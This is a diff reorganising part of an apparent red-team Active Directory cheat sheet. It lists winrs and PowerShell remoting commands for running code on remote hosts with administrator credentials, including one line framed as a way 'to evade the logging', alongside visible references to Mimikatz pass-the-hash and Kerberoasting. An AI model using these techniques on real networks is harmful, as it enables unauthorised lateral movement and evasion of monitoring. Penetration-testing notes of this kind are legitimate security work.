@@ -23,9 +23,20 @@ winrs -r:hostname cmd
 **Access C disk of a computer (check local admin)**\
 ls \\\\\[hostname]\c$
 
-**Connect to machine with administrator privs**\
-****Enter-PSSession -Computername
+**Connect to machine with administrator privs**
 
+```powershell
+Enter-PSSession -Computername
+
+Use winrs of PSRemoting to evade the logging
+winrs -r:hostname cmd
+winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run
+
+Other Remoting
+Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM 
+```
+
+****\
 **1-1 Save and use sessions of a machine**
 
 ```powershell
@@ -152,12 +163,7 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /
 
 Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
 
-**Use winrs of PSRemoting to evade the logging**\
-****winrs -r:hostname cmd\
-****winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run\
 \
-Other Remoting\
-Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM \
 
 
 ## **🍳Kerberoasting**
